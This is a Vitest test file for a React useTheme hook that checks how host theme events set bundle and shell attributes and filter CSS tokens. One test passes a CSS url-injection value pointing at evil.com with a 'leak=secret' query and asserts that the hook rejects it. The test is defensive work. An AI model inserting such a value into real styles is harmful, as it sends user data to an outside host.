import { describe, it, expect, vi, beforeEach } from "vitest";
import { renderHook, act } from "@testing-library/react";
import { useTheme } from "../hooks/useTheme.js";

function makeBridge() {
  let capturedHandler: ((data: unknown) => void) | undefined;
  const unsub = vi.fn();
  const bridge = {
    onEvent: vi.fn((type: string, handler: (data: unknown) => void) => {
      if (type === "host.theme.changed") capturedHandler = handler;
      return unsub;
    }),
    fire: (data: unknown) => act(() => { capturedHandler?.(data); }),
    unsub,
  };
  return bridge;
}

beforeEach(() => {
  document.documentElement.removeAttribute("data-theme-bundle");
  document.documentElement.removeAttribute("data-shell");
  document.documentElement.style.cssText = "";
});

describe("useTheme v2", () => {
  it("subscribes to host.theme.changed", () => {
    const bridge = makeBridge();
    renderHook(() => useTheme(bridge));
    expect(bridge.onEvent).toHaveBeenCalledWith("host.theme.changed", expect.any(Function));
  });

  it("sets data-theme-bundle on event", () => {
    const bridge = makeBridge();
    renderHook(() => useTheme(bridge));
    bridge.fire({ bundleId: "tokyo-night", shell: "dark" });
    expect(document.documentElement.getAttribute("data-theme-bundle")).toBe("tokyo-night");
  });

  it("sets data-shell on event", () => {
    const bridge = makeBridge();
    renderHook(() => useTheme(bridge));
    bridge.fire({ bundleId: "lge-light", shell: "light" });
    expect(document.documentElement.getAttribute("data-shell")).toBe("light");
  });

  it("accepts all valid bundleIds", () => {
    const validIds = ["tokyo-night", "midnight", "forest", "lge-light", "lge-dark", "high-contrast"];
    for (const bundleId of validIds) {
      document.documentElement.removeAttribute("data-theme-bundle");
      const bridge = makeBridge();
      renderHook(() => useTheme(bridge));
      bridge.fire({ bundleId, shell: "dark" });
      expect(document.documentElement.getAttribute("data-theme-bundle")).toBe(bundleId);
    }
  });

  it("rejects invalid bundleId — does not set data-theme-bundle", () => {
    const bridge = makeBridge();
    renderHook(() => useTheme(bridge));
    bridge.fire({ bundleId: "legacy-dark", shell: "dark" });
    expect(document.documentElement.hasAttribute("data-theme-bundle")).toBe(false);
  });

  it("removes stale data-theme-bundle when bundleId becomes invalid (Major #1)", () => {
    const bridge = makeBridge();
    renderHook(() => useTheme(bridge));
    // First apply valid bundleId
    bridge.fire({ bundleId: "midnight", shell: "dark" });
    expect(document.documentElement.getAttribute("data-theme-bundle")).toBe("midnight");
    // Then fire with invalid bundleId — stale attr must be removed
    bridge.fire({ bundleId: "legacy-dark", shell: "dark" });
    expect(document.documentElement.hasAttribute("data-theme-bundle")).toBe(false);
  });

  it("rejects invalid shell value — does not set data-shell", () => {
    const bridge = makeBridge();
    renderHook(() => useTheme(bridge));
    bridge.fire({ bundleId: "midnight", shell: "high-contrast" });
    expect(document.documentElement.hasAttribute("data-shell")).toBe(false);
  });

  it("removes stale data-shell when shell becomes invalid (Major #1)", () => {
    const bridge = makeBridge();
    renderHook(() => useTheme(bridge));
    // First apply valid shell
    bridge.fire({ bundleId: "lge-light", shell: "light" });
    expect(document.documentElement.getAttribute("data-shell")).toBe("light");
    // Then fire with invalid shell — stale attr must be removed
    bridge.fire({ bundleId: "lge-light", shell: "high-contrast" });
    expect(document.documentElement.hasAttribute("data-shell")).toBe(false);
  });

  it("applies only --lvis-* tokens, drops non-prefixed keys", () => {
    const bridge = makeBridge();
    renderHook(() => useTheme(bridge));
    bridge.fire({
      bundleId: "tokyo-night", shell: "dark",
      tokens: { "--lvis-bg": "#1a1b26", "--evil-key": "bad", "color": "red" },
    });
    expect(document.documentElement.style.getPropertyValue("--lvis-bg")).toBe("#1a1b26");
    expect(document.documentElement.style.getPropertyValue("--evil-key")).toBe("");
  });

  it("drops --lvis-* key not in LVIS_TOKEN_NAMES closed set", () => {
    const bridge = makeBridge();
    renderHook(() => useTheme(bridge));
    bridge.fire({
      bundleId: "midnight", shell: "dark",
      tokens: { "--lvis-bg": "#000", "--lvis-nonexistent-custom": "red" },
    });
    expect(document.documentElement.style.getPropertyValue("--lvis-bg")).toBe("#000");
    expect(document.documentElement.style.getPropertyValue("--lvis-nonexistent-custom")).toBe("");
  });

  it("rejects unsafe token values (url injection)", () => {
    const bridge = makeBridge();
    renderHook(() => useTheme(bridge));
    bridge.fire({
      bundleId: "forest", shell: "dark",
      tokens: { "--lvis-bg": "url(https://evil.com?leak=secret)" },
    });
    expect(document.documentElement.style.getPropertyValue("--lvis-bg")).toBe("");
  });

  it("does not throw on null payload", () => {
    const bridge = makeBridge();
    renderHook(() => useTheme(bridge));
    expect(() => bridge.fire(null)).not.toThrow();
  });

  it("calls unsub on unmount", () => {
    const bridge = makeBridge();
    const { unmount } = renderHook(() => useTheme(bridge));
    unmount();
    expect(bridge.unsub).toHaveBeenCalledTimes(1);
  });

  // Regression: v1 fields must NOT be present — validate they have no effect
  it("does not set legacy data-theme attribute (v1 field removed)", () => {
    const bridge = makeBridge();
    renderHook(() => useTheme(bridge));
    bridge.fire({ bundleId: "lge-dark", shell: "dark" });
    expect(document.documentElement.hasAttribute("data-theme")).toBe(false);
  });

  it("does not set legacy data-chat-theme attribute (v1 field removed)", () => {
    const bridge = makeBridge();
    renderHook(() => useTheme(bridge));
    bridge.fire({ bundleId: "lge-dark", shell: "dark" });
    expect(document.documentElement.hasAttribute("data-chat-theme")).toBe(false);
  });

  it("does not set legacy data-code-theme attribute (v1 field removed)", () => {
    const bridge = makeBridge();
    renderHook(() => useTheme(bridge));
    bridge.fire({ bundleId: "lge-dark", shell: "dark" });
    expect(document.documentElement.hasAttribute("data-code-theme")).toBe(false);
  });
});
